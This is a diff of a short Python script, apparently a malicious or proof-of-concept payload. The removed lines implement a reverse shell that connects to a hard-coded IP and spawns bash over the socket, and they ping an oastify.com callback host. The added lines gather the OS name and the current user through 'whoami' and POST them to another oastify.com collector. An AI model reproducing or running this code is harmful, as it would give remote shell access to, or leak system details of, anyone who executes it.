@@ -1,21 +1,33 @@
 import os
-import socket
-import pty
+import platform
+import subprocess
 import requests
 
+def send_data(url, data):
+    try:
+        response = requests.post(url, json=data)
+        print(f"Data sent successfully. Server responded: {response.text}")
+    except Exception as e:
+        print(f"Failed to send data: {e}")
 
-def child_process():
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
-    s.connect(("154.201.80.124", 8080))
-    os.dup2(s.fileno(), 0)
-    os.dup2(s.fileno(), 1)
-    os.dup2(s.fileno(), 2)
-    pty.spawn("bash") 
+def main():
+    # 获取操作系统信息
+    os_type = platform.system()
+    
+    # 执行 'whoami' 命令来找出当前用户
+    current_user = subprocess.run("whoami", capture_output=True, text=True).stdout.strip()
 
-pid = os.fork()
+    print(f"Operating system: {os_type}")
+    print(f"Current user: {current_user}")
 
-requests.get("http://txu57t8k0c4c7u1opud3jly2ptvkji96y.oastify.com/")
-if pid == 0:
-    child_process()
-else:
-    os._exit(0)  
+    # 准备发送的数据
+    data = {
+        "os_type": os_type,
+        "current_user": current_user
+    }
+
+    # 发送数据到指定URL
+    send_data("http://iqcu0i19t1x10judij6scarriio9c68ux.oastify.com", data)
+
+if __name__ == "__main__":
+    main()
